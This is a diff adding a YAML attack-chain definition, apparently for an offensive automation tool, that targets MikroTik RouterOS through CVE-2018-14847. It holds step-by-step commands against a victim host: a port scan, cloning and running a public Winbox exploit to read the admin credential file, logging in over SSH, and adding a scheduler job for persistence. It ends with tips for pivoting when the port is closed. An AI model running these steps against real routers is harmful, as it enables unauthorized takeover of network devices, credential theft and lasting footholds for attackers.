@@ -1,0 +1,70 @@
+chain_id: mikrotik_winbox_cve_2018_14847
+title: "MikroTik RouterOS — CVE-2018-14847 Winbox unauth file read → admin creds"
+severity: CRITICAL
+tags: [mikrotik, routeros, cve-2018-14847, winbox, file-read, default-creds]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2018-14847" }
+    - { banner_pattern: "(?i)mikrotik|routeros" }
+    - { product_pattern: "(?i)mikrotik|routeros" }
+    - { service_pattern: "(?i)winbox" }
+    - { port_in: [8291, 8728, 8729] }
+
+description: |
+  MikroTik RouterOS 6.29 → 6.42 has an authentication bypass in Winbox
+  on TCP/8291. An unauth attacker can read arbitrary files from the
+  router's filesystem — including `/rw/store/user.dat`, which holds
+  the admin password (XOR-obfuscated, trivially recovered). Once you
+  have admin you flip `/ip socks` and `/system scheduler` for
+  persistence, or upload a NPK package for SSH backdoor. Driver of the
+  VPNFilter and TrickBot router-foothold campaigns.
+
+steps:
+  - id: 1
+    title: "Confirm Winbox is exposed"
+    command: |
+      nmap -p 8291 -sV $VICTIMA
+      # Expect: 8291/tcp open winbox
+
+  - id: 2
+    title: "Read user.dat (admin hash file)"
+    command: |
+      git clone https://github.com/BasuCert/WinboxPoC /tmp/winbox
+      python3 /tmp/winbox/WinboxExploit.py $VICTIMA 8291
+
+  - id: 3
+    title: "Decode the recovered password"
+    command: |
+      # WinboxExploit prints `User: admin Pass: <plaintext>` directly.
+      # Manual decode if needed:
+      python3 -c "
+      import sys
+      data=open('user.dat','rb').read()
+      # 'XOR with key sequence 0x96..' — see Tenable writeup.
+      "
+
+  - id: 4
+    title: "Log into Winbox / SSH with the recovered creds"
+    command: |
+      ssh admin@$VICTIMA   # password from step 2
+      # In RouterOS shell:
+      /export
+      /system identity print
+      /interface print
+
+  - id: 5
+    title: "Persistence — schedule a script that re-enables Winbox if disabled"
+    command: |
+      /system scheduler add name=keepwinbox interval=1m on-event="/ip service enable winbox"
+
+common_errors:
+  - error: "WinboxExploit.py: 'connection refused' on 8291"
+    solution: |
+      Winbox bound to LAN only or moved to a non-default port. Scan
+      8728 / 8729 (API service — different unauth bug, CVE-2018-1156)
+      or pivot via SSH if 22 is open.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2018-14847
+  - https://www.tenable.com/blog/rooting-a-printer-mikrotik-cve-2018-14847
